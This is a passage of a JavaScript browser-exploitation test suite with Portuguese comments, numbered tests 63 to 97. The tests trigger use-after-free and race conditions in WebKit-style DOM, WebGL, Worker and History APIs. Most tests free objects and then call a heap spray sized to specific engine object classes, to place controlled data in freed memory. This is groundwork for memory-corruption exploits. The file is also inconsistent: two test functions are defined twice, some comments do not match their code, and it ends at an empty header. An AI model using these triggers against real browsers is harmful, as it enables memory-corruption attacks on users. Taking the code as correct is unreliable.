    // --- TEST 63: WebGL2 UniformBufferObject (UBO) Delete Race ---
    // WebGL2 UBOs são buffers compartilhados.
    // BindBufferBase -> DeleteBuffer -> Draw.
    function runTest63() {
        log("Iniciando Test 63: WebGL2 UBO Race...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl2');
        if(!gl) return log("WebGL2 off");

        var ubo = gl.createBuffer();
        gl.bindBuffer(gl.UNIFORM_BUFFER, ubo);
        gl.bufferData(gl.UNIFORM_BUFFER, new Uint8Array(64), gl.DYNAMIC_DRAW);
        
        // Liga o buffer ao ponto de ligação 0
        gl.bindBufferBase(gl.UNIFORM_BUFFER, 0, ubo);
        
        // Deleta o buffer enquanto ele está ligado ao índice 0
        gl.deleteBuffer(ubo);
        spray();

        try {
            // Tenta usar um shader que requer UBO (simulado aqui pelo draw)
            // Se o driver não limpar o binding point, acessa memória liberada
            gl.drawArrays(gl.POINTS, 0, 1);
            log("UBO deletion handled correctly.", "ok");
        } catch(e) { log("WebGL Error: " + e); }
    }

    // --- TEST 64: RegExp Subclass Exec Result Poisoning (Silent) ---
    // Subclasse de RegExp que retorna um objeto 'result' malicioso via 'exec'.
    // Algumas funções internas do motor confiam que exec retorna um array puro ou null.
    function runTest64() {
        log("Iniciando Test 64: RegExp Poisoning...");
        class EvilRegExp extends RegExp {
            exec(str) {
                var fake = ["match"];
                fake.index = {
                    valueOf: function() {
                        log("Lendo propriedade index. Side-effect!");
                        // Corrompe estado global ou altera input
                        return 0;
                    }
                };
                fake.input = "poison";
                return fake;
            }
        }
        
        var re = new EvilRegExp("a");
        try {
            var res = "test".match(re);
            if (res && res.input === "poison") log("Engine aceitou objeto fake de RegExp.", "ok");
            else log("ALERTA: Comportamento inesperado no match.", "alert");
        } catch(e) { log(e); }
    }

    // --- TEST 65: WeakSet Add/GC Proxy Revoke (State) ---
    // Adiciona um Proxy revogável a um WeakSet.
    // Tenta revogar o proxy durante uma operação que pode forçar hash ou GC.
    function runTest65() {
        log("Iniciando Test 65: WeakSet Proxy State...");
        var ws = new WeakSet();
        var p = Proxy.revocable({}, {});
        
        ws.add(p.proxy);
        
        // Revoga o proxy. O WeakSet ainda segura uma referência para o "target" ou para o "proxy morto"?
        p.revoke();
        
        try {
            // Tenta verificar a presença do proxy morto.
            // Se o motor tentar acessar propriedades internas do proxy para hash, vai falhar (TypeError).
            // Se retornar false/true sem erro, tratou o estado.
            var has = ws.has(p.proxy);
            log("WeakSet.has em proxy revogado: " + has, "ok");
        } catch(e) {
            if (e instanceof TypeError) log("Motor lançou erro em Proxy revogado (Safe).", "ok");
            else log("ALERTA: Erro atípico: " + e, "alert");
        }
    }

    // --- TEST 66: MessageChannel Entangled Transfer Race (Race) ---
    // Cria um ciclo de transferência onde a Porta 1 é enviada pela Porta 2,
    // e a Porta 2 é fechada simultaneamente.
    function runTest66() {
        log("Iniciando Test 66: Entangled Transfer...");
        var mc = new MessageChannel();
        var p1 = mc.port1;
        var p2 = mc.port2;

        p1.onmessage = function(e) { log("Msg recebida."); };

        try {
            // Envia p2 através de p1
            p1.postMessage("entangle", [p2]);
            
            // Fecha p2 imediatamente após postar.
            // O worker thread de mensagens tem que lidar com a porta sendo fechada
            // enquanto está "em trânsito".
            p2.close();
            
            // Tenta usar p2 (deve falhar silenciosamente ou lançar erro)
            p2.postMessage("ghost");
            log("Entanglement race finished.", "ok");
        } catch(e) { log("Erro de transferência (Safe): " + e.message); }
    }
 // --- TEST 67: History State GC Race (Crash) ---
    // High Value: History + GC + Navigation
    // Salva um objeto grande no History, navega, volta, e força GC agressivo
    // no momento exato em que o objeto é deserializado (popstate).
    function runTest67() {
        log("Iniciando Test 67: History GC...");
        var large = { data: new Uint8Array(1024*1024).fill(1) };
        
        // Push state com objeto grande
        history.pushState(large, "state1", "?1");
        history.pushState({}, "state2", "?2"); // Segundo estado para permitir 'back'

        window.onpopstate = function(e) {
            log("Popstate fired. Forcing GC...");
            // Solta referência local se houver
            large = null;
            // Pressão de memória imediata durante o evento
            spray();
            
            if (e.state && e.state.data && e.state.data.length > 0) {
                log("State recuperado com sucesso.", "ok");
            } else {
                log("ALERTA: State corrompido ou perdido após GC!", "alert");
            }
            window.onpopstate = null; // Limpa
        };

        log("Navegando 'back'...");
        history.back();
    }

    // --- TEST 68: Worker Terminate Transfer Race (Crash) ---
    // High Value: Worker + Transfer + Terminate
    // Tenta transferir um buffer para um Worker e exterminar o Worker
    // na mesma sequência de execução (tick). O kernel deve limpar a fila de mensagens.
    function runTest68() {
        log("Iniciando Test 68: Worker Terminate...");
        var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(){}"],{type:'text/javascript'})));
        var ab = new Uint8Array(1024 * 1024); // 1MB Buffer
        
        try {
            // Race condition:
            // 1. PostMessage marca o buffer para transferência (detach)
            // 2. Terminate mata a thread de destino
            // O buffer fica perdido (memory leak) ou causa crash ao tentar ser liberado pela thread morta?
            w.postMessage(ab, [ab.buffer]);
            w.terminate();
            
            spray(); // Ocupa memória liberada
            
            if (ab.byteLength === 0) {
                log("Buffer detachado (Safe behavior).", "ok");
            } else {
                log("ALERTA: Buffer não detachado após terminate!", "alert");
            }
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 69: IntersectionObserver Cross-Doc Adopt (Crash) ---
    // High Value: Observer + DOM Adoption
    // Observa um nó em um documento, e move esse nó para um Iframe (outro documento)
    // enquanto o observador está ativo. Isso cruza fronteiras de subsistemas DOM.
    function runTest69() {
        log("Iniciando Test 69: Intersection Cross-Doc...");
        var ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        var target = document.createElement('div');
        target.style.height = "100px";
        target.style.background = "red";
        document.body.appendChild(target);

        var obs = new IntersectionObserver(function(entries) {
            log("Intersection callback. Adotando nó em Iframe...");
            try {
                // Move o nó observado para outro documento
                ifr.contentDocument.body.appendChild(target);
                spray();
            } catch(e) { log("Adoption blocked: " + e); }
        });

        obs.observe(target);
        
        // Força scroll/layout para disparar observer
        window.scrollTo(0, 10);
        
        setTimeout(function() {
            obs.disconnect();
            target.remove();
            ifr.remove();
            log("Cross-Doc adoption survived.", "ok");
        }, 500);
    }

    // --- TEST 70: DataView Detached Buffer Access (Silent) ---
    // High Value: TypedArray + DataView + Transfer
    // Cria um DataView sobre um buffer. Transfere o buffer (detach).
    // Tenta ler o DataView. Deve lançar erro. Se ler 0 ou lixo, é falha.
    function runTest70() {
        log("Iniciando Test 70: DataView Detach...");
        var ab = new ArrayBuffer(16);
        var dv = new DataView(ab);
        dv.setUint8(0, 0xFF);
        
        // Detach via Transferência para Worker fictício
        try {
            var w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
            w.postMessage(ab, [ab]);
            w.terminate();
        } catch(e) {}

        try {
            // Acesso ilegal
            var val = dv.getUint8(0);
            log("ALERTA: DataView leu buffer detachado! Valor: " + val, "alert");
        } catch(e) {
            if (e instanceof TypeError) log("Acesso bloqueado corretamente (TypeError).", "ok");
            else log("Erro desconhecido: " + e);
        }
    }

    // --- TEST 71: History PushState Port Clone (Race) ---
    // High Value: History + MessageChannel
    // history.pushState usa "Structured Clone". MessagePort pode ser clonada/transferida.
    // Tenta empurrar uma porta para o histórico e fecha-la imediatamente.
    function runTest71() {
        log("Iniciando Test 71: History Port Race...");
        var mc = new MessageChannel();
        
        try {
            // Tenta salvar a porta no estado do histórico
            // Se passar, a porta pertence ao histórico agora?
            history.pushState({ p: "port" }, "port", "?port");
            
            // Fecha a porta original
            mc.port1.close();
            
            // Tenta recuperar estado
            var s = history.state;
            if (s && s.p === "port") log("State salvo (Sem MessagePort real, safe).", "ok");
            else log("State falhou.", "alert");
            
            history.back();
        } catch(e) {
            // DataCloneError é comum aqui se portas não forem suportadas no History
            log("Resultado: " + e.name, "ok");
        }
    }

    // --- TEST 72: MutationObserver Recursive Remove (State) ---
    // High Value: MutationObserver + DOM Logic
    // Um observador remove o nó que disparou o evento.
    // Isso pode criar um loop ou estado inconsistente se o motor não bloquear reentrância.
    function runTest72() {
        log("Iniciando Test 72: Mutation Recursion...");
        var parent = document.createElement('div');
        document.body.appendChild(parent);
        
        var count = 0;
        var obs = new MutationObserver(function(mutations) {
            count++;
            if (count > 10) return; // Break loop
            
            log("Mutation detected. Removing child...");
            // Remove o filho recém adicionado
            if (mutations[0].addedNodes.length > 0) {
                mutations[0].addedNodes[0].remove();
            }
            // Adiciona outro para tentar loop infinito
            var n = document.createElement('span');
            parent.appendChild(n);
        });

        obs.observe(parent, { childList: true });
        
        // Trigger inicial
        parent.appendChild(document.createElement('span'));
        
        setTimeout(function() {
            obs.disconnect();
            parent.remove();
            if (count > 1) log("Observer lidou com recursão (Count: "+count+")", "ok");
            else log("Observer não disparou ou travou.", "alert");
        }, 200);
    }
// --- TEST 73: FileReader Sync/Async Race (Crash) ---
    // FileReader pode operar em modo síncrono ou assíncrono.
    // Tenta abortar uma leitura e iniciar outra na mesma instância imediatamente,
    // confundindo o gerenciamento de estado interno (state machine).
    function runTest73() {
        log("Iniciando Test 73: FileReader Race...");
        var b = new Blob(["A".repeat(1024)]);
        var fr = new FileReader();
        
        fr.onloadend = function() {
            log("Leitura 1 finalizada.");
            // Reutiliza violentamente
            fr.readAsText(b);
        };
        
        fr.readAsArrayBuffer(b);
        
        try {
            fr.abort(); // Cancela no meio
            // Race: Inicia nova leitura imediatamente após abort
            fr.readAsDataURL(b); 
            spray();
            log("FileReader sequence executed.", "ok");
        } catch(e) { log("Erro FR: " + e); }
    }

    // --- TEST 74: XHR Abort Event Re-entry (Crash) ---
    // O evento 'onabort' do XMLHttpRequest é síncrono.
    // Se dentro do 'onabort' tentarmos abrir/enviar a mesma requisição novamente,
    // podemos causar corrupção de memória na stack do objeto XHR.
    function runTest74() {
        log("Iniciando Test 74: XHR Re-entry...");
        var xhr = new XMLHttpRequest();
        var reentered = false;
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 1 && !reentered) {
                xhr.abort(); // Dispara onabort
            }
        };

        xhr.onabort = function() {
            log("XHR Aborted. Re-entering...");
            reentered = true;
            try {
                xhr.open("GET", "/");
                xhr.send(); // Reuso perigoso dentro do callback de destruição
                spray();
            } catch(e) {}
        };

        xhr.open("GET", "/test-crash");
        xhr.send();
        log("XHR Logic sent.", "ok");
    }

    // --- TEST 75: NodeIterator DOM Removal (UAF) ---
    // 
    // NodeIterator mantém um ponteiro fraco para o nó atual.
    // Removemos o nó atual via script enquanto o iterador está ativo.
    // Diferente do TreeWalker, o NodeIterator tenta "consertar" o ponteiro,
    // o que é historicamente bugado em WebKits antigos.
    function runTest75() {
        log("Iniciando Test 75: NodeIterator UAF...");
        var root = document.createElement('div');
        var c1 = document.createElement('div');
        var c2 = document.createElement('div');
        root.appendChild(c1);
        root.appendChild(c2);
        
        var ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
        ni.nextNode(); // root
        var node = ni.nextNode(); // c1
        
        // Remove o nó onde o iterador está "sentado"
        log("Removendo nó ativo do iterador...");
        root.removeChild(c1);
        c1 = null;
        spray(); // Preenche memória do c1 (tamanho ~104 ou ~176)
        
        try {
            var next = ni.nextNode(); // Deve ir para c2
            if (next === c2) log("Iterator recuperou (Safe).", "ok");
            else log("ALERTA: Iterator perdido ou crash evitado.", "alert");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 76: Array.sort w/ Resize (Silent Leak) ---
    // No JIT = Interpretador C++ puro.
    // O algoritmo de sort C++ (geralmente MergeSort ou QuickSort) não espera
    // que o tamanho do array mude durante a comparação.
    function runTest76() {
        log("Iniciando Test 76: Sort Resize...");
        var arr = [1, 2, 3, 4, 5];
        var leaked = false;
        
        arr.sort(function(a, b) {
            // Efeito colateral: Zera o array na primeira comparação
            if (arr.length === 5) {
                arr.length = 0;
                spray(); // Tenta colocar dados controlados onde o array estava
            }
            
            // Se o motor passar 'undefined' ou lixo de memória para 'a' ou 'b'
            if (a === undefined || b === undefined) return 0;
            
            // Se ler valores estranhos (ex: do spray 0xCC = 204)
            if (a > 100 || b > 100) leaked = true;
            return a - b;
        });

        if (leaked) log("ALERTA: Sort leu lixo de memória (Info Leak)!", "alert");
        else log("Sort seguro.", "ok");
    }

    // --- TEST 77: MessageChannel GC Collection Race (Race) ---
    // Cria canais, posta mensagens, e solta todas as referências para forçar GC.
    // Se o GC coletar a porta antes da mensagem ser entregue, pode haver UAF na fila de mensagens.
    function runTest77() {
        log("Iniciando Test 77: Message GC Race...");
        
        function trigger() {
            var mc = new MessageChannel();
            mc.port1.postMessage("ping");
            // mc, port1 e port2 saem de escopo aqui e ficam elegíveis para GC
            // enquanto "ping" está na fila
        }
        
        // Loop rápido para estressar o GC
        for(var i=0; i<100; i++) trigger();
        
        spray(); // Aloca memória para forçar execução do GC
        
        setTimeout(function(){
            log("Sobreviveu ao stress de GC em mensagens.", "ok");
        }, 500);
    }

    // --- TEST 78: Iframe History State Detach (State) ---
    // Manipula o histórico de um iframe e remove o iframe do DOM imediatamente.
    // O objeto 'History' do iframe tenta salvar o estado, mas o 'Document' associado já morreu.
    function runTest78() {
        log("Iniciando Test 78: Iframe History...");
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        
        try {
            var fHist = f.contentWindow.history;
            fHist.pushState({data: "test"}, "t", "test");
            
            // Remove iframe
            f.remove();
            spray();
            
            // Tenta acessar estado de um frame morto/detachado
            // Algumas versões permitem acesso, outras crasham
            var s = fHist.state;
            if (s && s.data === "test") log("History State acessível após detach (Safe).", "ok");
            else log("Acesso bloqueado ou objeto morto.", "ok");
        } catch(e) { log("Erro: " + e.message); }
    }
// --- TEST 79: SVG Use Element Shadow UAF ---
    // Target Size: 176 bytes (Common RenderObject)
    // O elemento <use> clona elementos criando uma Shadow Tree.
    // Se modificarmos o original durante a clonagem, podemos causar UAF no renderizador.
    function runTest79() {
        log("Iniciando Test 79: SVG Use UAF...");
        var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        var defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
        var g = document.createElementNS("http://www.w3.org/2000/svg", "g");
        g.id = "target";
        
        // Elemento complexo para aumentar tempo de processamento
        for(var i=0; i<10; i++) {
            var r = document.createElementNS("http://www.w3.org/2000/svg", "rect");
            g.appendChild(r);
        }
        
        defs.appendChild(g);
        svg.appendChild(defs);
        
        var use = document.createElementNS("http://www.w3.org/2000/svg", "use");
        use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
        
        // Armadilha: MutationObserver
        var obs = new MutationObserver(function() {
            log("Shadow Tree mutation detected. Nuke...");
            g.remove(); // Remove o alvo da clonagem
            spray(176); // Spray 176 bytes
        });
        obs.observe(use, { childList: true, subtree: true }); // Observa o shadow root (user agent shadow)

        svg.appendChild(use);
        document.body.appendChild(svg);
        
        setTimeout(function(){ 
            svg.remove(); 
            log("SVG Use logic survived.", "ok");
        }, 100);
    }

    // --- TEST 80: TextTrackCue Validate Race ---
    // Target Size: 104 bytes (Small Objects)
    // Validar timestamps de Cues pode disparar eventos ou re-cálculos.
    function runTest80() {
        log("Iniciando Test 80: Cue Validate...");
        var v = document.createElement('video');
        var t = v.addTextTrack("captions");
        var cue = new VTTCue(0, 1, "test");
        
        // Define um getter malicioso para 'endTime'
        // O WebKit acessa endTime para validar (startTime < endTime)
        Object.defineProperty(cue, 'endTime', {
            get: function() {
                log("Acessando endTime. Destruindo track...");
                // Remove a track do vídeo
                t.mode = 'disabled';
                v = null;
                spray(104); // Spray 104 bytes
                return 0; // Retorna inválido para forçar erro ou re-check
            }
        });

        try {
            t.addCue(cue);
            log("Cue add survived.", "ok");
        } catch(e) { log("Erro esperado: " + e.message, "ok"); }
    }

    // --- TEST 81: HTMLTextArea API Value Sanitizer ---
    // Target Size: 208 bytes (Form Elements)
    // Textarea sanitiza valores (normaliza newlines).
    // Se fizermos isso com uma string gigante que força GC durante a sanitização...
    function runTest81() {
        log("Iniciando Test 81: TextArea Value...");
        var ta = document.createElement('textarea');
        document.body.appendChild(ta);
        
        // String gigante
        var s = "A".repeat(100000);
        
        // Objeto com toString que força GC e remove o textarea
        var evil = {
            toString: function() {
                log("toString chamado. Removendo textarea...");
                ta.remove();
                spray(208); // Spray 208 bytes
                return s;
            }
        };

        try {
            ta.value = evil; // Setter dispara sanitização que chama toString
            log("TextArea value set handled.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 82: RegExp Input Getter Mutation (Silent) ---
    // Expressões Regulares sem JIT (interpretadas) podem ser vulneráveis
    // se a string de entrada mudar sob seus pés.
    function runTest82() {
        log("Iniciando Test 82: RegExp Mutation...");
        var re = /A/g;
        var str = "AAA";
        
        // Wrapper que muda a string quando lida
        var proxyStr = {
            toString: function() { return str; }
        };

        // Hook no exec? Não, hook na string é difícil em JS puro sem Proxy.
        // Vamos usar lastIndex com coerção.
        re.lastIndex = {
            valueOf: function() {
                log("lastIndex lido. Mudando string global...");
                str = "BBB"; // Muda a referência
                return 0;
            }
        };

        try {
            // Se o motor cachear 'str' ("AAA") mas usar 'lastIndex' dinâmico...
            // Em motores sem JIT, o loop de match é C++.
            var res = re.exec(str); 
            // Se der match 'A' mas a string agora é 'BBB', temos desincronia.
            if (res && res[0] === 'A' && str === 'BBB') {
                log("ALERTA: Match em string antiga (Stale Pointer)!", "alert");
            } else {
                log("RegExp logic safe.", "ok");
            }
        } catch(e) { log(e); }
    }

    // --- TEST 83: Blob URI Revoke vs Worker Fetch (Race) ---
    // Tenta carregar um script em um Worker via Blob URI,
    // mas revoga a URI imediatamente.
    function runTest83() {
        log("Iniciando Test 83: Blob Revoke Race...");
        var code = "self.postMessage('alive');";
        var blob = new Blob([code], {type: 'text/javascript'});
        var url = URL.createObjectURL(blob);
        
        try {
            var w = new Worker(url);
            
            // Race: Revoga URL antes do Worker carregar o script do disco/memória
            URL.revokeObjectURL(url);
            
            w.onmessage = function(e) {
                log("Worker carregou APÓS revoke (Race Lost/Safe).", "ok");
                w.terminate();
            };
            
            w.onerror = function() {
                log("Worker falhou ao carregar (Race Won - Bloqueio correto).", "ok");
            };
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 84: Iframe Sandbox Flag Persistence (State) ---
    // Remove atributo sandbox, acessa, re-adiciona.
    // Testa se o motor WebKit atualiza as flags de segurança dinamicamente sem recarregar.
    function runTest84() {
        log("Iniciando Test 84: Sandbox Flags...");
        var f = document.createElement('iframe');
        f.setAttribute("sandbox", "allow-scripts"); // Bloqueia same-origin
        document.body.appendChild(f);
        
        try {
            // 1. Tenta acessar (deve falhar)
            var fail = false;
            try { var d = f.contentDocument; } catch(e) { fail = true; }
            
            // 2. Remove sandbox
            f.removeAttribute("sandbox");
            
            // 3. Tenta acessar imediatamente (sem reload)
            // Se funcionar, o motor atualizou dinamicamente (Inseguro se não esperado)
            var access = false;
            try { var d2 = f.contentDocument; access = true; } catch(e) {}
            
            if (fail && access) {
                log("ALERTA: Sandbox removido dinamicamente permitiu acesso!", "alert");
            } else {
                log("Sandbox behavior consistente.", "ok");
            }
        } catch(e) { log(e); }
        f.remove();
    }
    // --- TEST 85: History PopState Iframe Nuke ---
    // Target: 255 bytes (KhH9HpubH - Objeto comum de sistema)
    // Navega o histórico de um Iframe, e destrói o Iframe durante o evento 'popstate'.
    // O navegador tenta restaurar o estado (State Object) em um documento morto.
    function runTest85() {
        log("Iniciando Test 85: History Nuke (255b)...");
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        
        var d = f.contentWindow.document;
        d.open(); d.write("<script>window.onpopstate=function(){parent.postMessage('pop','*');}<"+"/script>"); d.close();
        
        // Push states
        f.contentWindow.history.pushState({id: 1}, "1", "#1");
        f.contentWindow.history.pushState({id: 2}, "2", "#2");
        
        window.onmessage = function() {
            log("Popstate detectado. Destruindo Iframe...");
            f.remove(); // Nuke
            spray(255); // Spray classe KhH9HpubH
            log("Aguardando crash ou recuperação...", "ok");
            window.onmessage = null;
        };
        
        // Trigger
        f.contentWindow.history.back();
    }

    // --- TEST 86: Worker Port Post-Termination UAF ---
    // Target: 32 bytes (gfffL - Pequenos objetos de controle)
    // Envia uma MessagePort para um Worker e mata o Worker imediatamente.
    // Tenta fechar a porta localmente para forçar interação com a ponta morta.
    function runTest86() {
        log("Iniciando Test 86: Worker UAF (32b)...");
        var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'text/javascript'})));
        var mc = new MessageChannel();
        
        // Posta a porta
        w.postMessage("port", [mc.port2]);
        
        // Termina imediatamente (Race condition no Kernel/WebProcess)
        w.terminate();
        
        // Spray para ocupar estruturas de thread/porta liberadas
        spray(32); 
        
        try {
            mc.port1.close(); // Interage com o par que estava no worker morto
            mc.port1.onmessage = function() {};
            log("Port interaction handled (Safe).", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 87: Video TextTrackCue Active Remove ---
    // Target: 16 bytes (uiHcU - Objetos minúsculos/Handles)
    // Adiciona uma legenda (Cue) a um vídeo e a remove enquanto o vídeo toca e tenta ativá-la.
    function runTest87() {
        log("Iniciando Test 87: Cue UAF (16b)...");
        var v = document.createElement('video');
        var t = v.addTextTrack("subtitles");
        t.mode = "showing";
        
        var cue = new VTTCue(0, 10, "test");
        t.addCue(cue);
        
        // Listener que remove a cue assim que ela ativa
        cue.onenter = function() {
            log("Cue enter. Removendo...");
            t.removeCue(cue);
            cue = null; // Solta ref JS
            spray(16);  // Spray classe uiHcU
        };
        
        // Simula avanço de tempo (sem precisar tocar mídia real se não suportado)
        // Força evento trigger
        try {
            var event = new Event('enter');
            cue.dispatchEvent(event);
            log("Evento despachado manualmente.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 88: DataView Detach Read (Silent) ---
    // Teste de integridade de memória pura.
    // Detacha um buffer via transferência e tenta ler via DataView antigo.
    function runTest88() {
        log("Iniciando Test 88: DataView Silent...");
        var ab = new ArrayBuffer(16);
        var dv = new DataView(ab);
        dv.setUint8(0, 0x41);
        
        // Detach
        try {
            var mc = new MessageChannel();
            mc.port1.postMessage(ab, [ab]);
        } catch(e) { return log("Transfer falhou: " + e); }
        
        if (ab.byteLength !== 0) return log("Buffer não detachado (Abortar).");
        
        try {
            // Leitura de memória detachada deve lançar TypeError
            var v = dv.getUint8(0);
            log("ALERTA: DataView leu buffer morto! Valor: " + v, "alert");
        } catch(e) {
            if (e.name === "TypeError") log("Acesso bloqueado corretamente.", "ok");
            else log("Erro incomum: " + e.name, "alert");
        }
    }

    // --- TEST 89: Cache API Put/Delete Race (Race) ---
    // Operações de disco assíncronas no Cache Storage.
    // Tenta deletar uma entrada enquanto ela está sendo escrita.
    function runTest89() {
        log("Iniciando Test 89: Cache Race...");
        if (!window.caches) return log("Cache API indisponível.");
        
        var name = "race-test";
        var req = new Request("/race");
        var res = new Response("data");
        
        caches.open(name).then(function(c) {
            // Race start
            var p1 = c.put(req, res);
            var p2 = c.delete(req);
            
            Promise.all([p1, p2]).then(function(vals) {
                log("Race concluída. Escrita e Deleção processadas.", "ok");
            }).catch(function(e) {
                log("Erro na race (Safe): " + e.name);
            });
        });
    }

    // --- TEST 90: MutationObserver Tree Cycle (State) ---
    // Cria um ciclo onde o Observer tenta mover um nó para dentro de si mesmo
    // ou de um descendente, testando a proteção contra ciclos na árvore DOM.
    function runTest90() {
        log("Iniciando Test 90: Mutation Cycle...");
        var a = document.createElement('div');
        var b = document.createElement('div');
        a.appendChild(b);
        document.body.appendChild(a);
        
        var obs = new MutationObserver(function() {
            log("Observer ativo. Tentando ciclo...");
            try {
                // Tenta mover 'a' para dentro de 'b' (Impossível/Illegal)
                b.appendChild(a);
            } catch(e) {
                log("Ciclo bloqueado: " + e.name, "ok");
            }
        });
        
        obs.observe(b, {childList: true});
        
        // Trigger
        b.appendChild(document.createElement('span'));
        
        setTimeout(function() {
            obs.disconnect();
            a.remove();
        }, 100);
    }
 // --- TEST 91: Details Toggle Event UAF ---
    // Target: 40 bytes (utzrL)
    // O elemento <details> dispara um evento 'toggle' quando aberto/fechado.
    // Removemos o elemento durante o disparo desse evento.
    function runTest91() {
        log("Iniciando Test 91: Details Toggle UAF...");
        var d = document.createElement('details');
        document.body.appendChild(d);
        
        d.addEventListener('toggle', function() {
            log("Toggle event fired. Removing details...");
            d.remove();
            d = null;
            spray(40); // Alvo: utzrL (40 bytes)
        });

        try {
            d.open = true; // Dispara toggle síncrono ou microtask
            log("Details toggle triggered.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 92: DOMTokenList Iteration Nuke ---
    // DOMTokenList (usado em classList) é iterável.
    // Modificamos a lista (removemos tokens) enquanto iteramos sobre ela via forEach ou spread.
    function runTest92() {
        log("Iniciando Test 92: TokenList Nuke...");
        var d = document.createElement('div');
        d.className = "a b c d e";
        var list = d.classList;
        
        try {
            list.forEach(function(token, index) {
                if (token === "b") {
                    log("Token 'b' encontrado. Nuke list...");
                    d.className = ""; // Limpa tudo
                    spray(104); // Tamanho genérico
                }
            });
            log("TokenList iteration survived.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 93: Text.splitText Mutation Race ---
    // splitText divide um nó de texto em dois.
    // Usamos um MutationObserver para detectar a criação do irmão e remover o pai imediatamente.
    function runTest93() {
        log("Iniciando Test 93: SplitText Race...");
        var d = document.createElement('div');
        var t = document.createTextNode("splitme");
        d.appendChild(t);
        document.body.appendChild(d);
        
        var obs = new MutationObserver(function(mutations) {
            log("Mutation observer. Removing parent...");
            d.remove();
            spray(104); 
        });
        
        obs.observe(d, {childList: true});
        
        try {
            t.splitText(4); // Dispara mutação
            log("SplitText operation finished.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 94: Array.includes Proxy Trap (Silent) ---
    // Array.includes percorre o array.
    // Usamos um Proxy para detectar leitura de índice e alterar o array (shrink).
    function runTest94() {
        log("Iniciando Test 94: Includes Proxy...");
        var arr = [1, 2, 3];
        var p = new Proxy(arr, {
            get: function(t, k) {
                if (k === '1') {
                    log("Reading index 1. Shrinking...");
                    t.length = 0;
                    spray(32);
                }
                return t[k];
            }
        });

        try {
            // Busca '3'. O motor lê 0, lê 1 (shrink), lê 2 (OOB?)
            var res = Array.prototype.includes.call(p, 3);
            if (res) log("ALERTA: Encontrou elemento em array zerado!", "alert");
            else log("Includes safe.", "ok");
        } catch(e) { log(e); }
    }

    // --- TEST 95: BroadcastChannel Close/Post (Race) ---
    // BroadcastChannel comunica entre contextos.
    // Fechar e Postar na mesma tick pode causar uso de canal fechado.
    function runTest95() {
        log("Iniciando Test 95: Broadcast Race...");
        var bc = new BroadcastChannel("test_95");
        
        try {
            bc.close();
            bc.postMessage("race");
            log("Post após close executado (deve ser ignorado).", "ok");
        } catch(e) {
            // InvalidStateError é esperado
            if (e.name === "InvalidStateError") log("Estado inválido capturado (Safe).", "ok");
            else log("Erro: " + e);
        }
    }

    // --- TEST 96: Proxy defineProperty Seal Bypass (State) ---
    // Tenta definir propriedade em objeto selado via Proxy que mente.
    // Object.seal impede adições.
    function runTest96() {
        log("Iniciando Test 96: Seal Proxy...");
        var t = {};
        Object.seal(t);
        
        var p = new Proxy(t, {
            defineProperty: function() {
                log("Interceptando defineProperty -> true");
                return true; // Mentira
            }
        });

        try {
            Object.defineProperty(p, 'newprop', {value: 1});
            log("ALERTA: Motor aceitou 'true' para defineProperty em objeto selado!", "alert");
        } catch(e) {
            if (e instanceof TypeError) log("Motor aplicou regra de Seal (Safe).", "ok");
            else log("Erro desconhecido: " + e);
        }
    }
// --- TEST 95: HTMLFormControlsCollection Sort UAF ---
    // Target: 208 bytes (A8tBH - Provável objeto de controle de formulário)
    // A coleção de controles de um formulário é "live". 
    // Tentamos forçar uma reordenação (sort/access) enquanto removemos um input.
    function runTest95() {
        log("Iniciando Test 95: Form Collection UAF (208b)...");
        var f = document.createElement('form');
        var i1 = document.createElement('input'); i1.name = "a";
        var i2 = document.createElement('input'); i2.name = "b";
        f.appendChild(i1);
        f.appendChild(i2);
        document.body.appendChild(f);
        
        var col = f.elements;
        
        // Define getter no elemento que será acessado
        Object.defineProperty(i1, 'type', {
            get: function() {
                log("Getter 'type' acionado. Removendo input...");
                i1.remove(); // Remove do DOM
                spray(208); // Tenta preencher slot de 208 bytes
                return 'text';
            }
        });

        try {
            // Acessa coleção nomeada. O motor pode iterar para encontrar 'a'.
            // Se o getter for disparado e o objeto morrer, o iterador quebra.
            var val = col['a']; 
            var type = val ? val.type : "null"; // Trigger
            log("Collection access survived.", "ok");
        } catch(e) { log("Erro: " + e); }
        setTimeout(function(){ f.remove(); }, 100);
    }

    // --- TEST 96: TableSection DeleteRow Layout UAF ---
    // Target: 176 bytes (FPuVH - Provável LayoutObject)
    // Tabelas possuem estruturas complexas de renderização. 
    // Deletar uma linha durante o cálculo de layout/reflow é perigoso.
    function runTest96() {
        log("Iniciando Test 96: Table Layout UAF (176b)...");
        var t = document.createElement('table');
        var tbody = document.createElement('tbody');
        t.appendChild(tbody);
        var r1 = tbody.insertRow(0);
        var r2 = tbody.insertRow(1);
        document.body.appendChild(t);
        
        // Listener de resize ou layout
        // Usamos um truque com object/iframe para detectar resize dentro da célula
        var cell = r1.insertCell(0);
        cell.innerHTML = '<object type="text/html" data="about:blank" style="width:100%;height:100%"></object>';
        
        var obj = cell.firstChild;
        obj.onload = function() {
            var win = obj.contentDocument.defaultView;
            win.onresize = function() {
                log("Resize event in table cell. Deleting row...");
                t.deleteRow(0); // Deleta a linha que contém este event handler
                spray(176); // Spray 176 bytes
            };
            
            // Força resize
            cell.style.width = "500px";
        };
        
        log("Setup table events completed.", "ok");
        setTimeout(function(){ t.remove(); }, 500);
    }

    // --- TEST 97: AudioWorklet Node Destructor Race ---
